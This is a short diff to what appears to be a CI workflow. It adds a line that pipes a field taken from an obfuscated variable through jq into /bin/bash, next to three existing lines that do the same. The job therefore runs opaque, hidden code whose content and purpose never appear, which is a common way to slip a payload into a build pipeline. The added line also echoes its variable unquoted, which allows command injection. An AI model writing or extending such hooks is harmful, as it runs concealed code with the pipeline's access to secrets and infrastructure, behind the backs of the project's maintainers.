@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$e14619" | jq -r .ntg33 | /bin/bash
           printf '%s' "$k16549" | jq -r .sy253 | /bin/bash
           printf '%s' "$pmxdr404" | jq -r .vbqgz3932 | /bin/bash
+          echo $omdy90 | jq -r .pov81 | /bin/bash
 
       - name: Store results
         if: always()
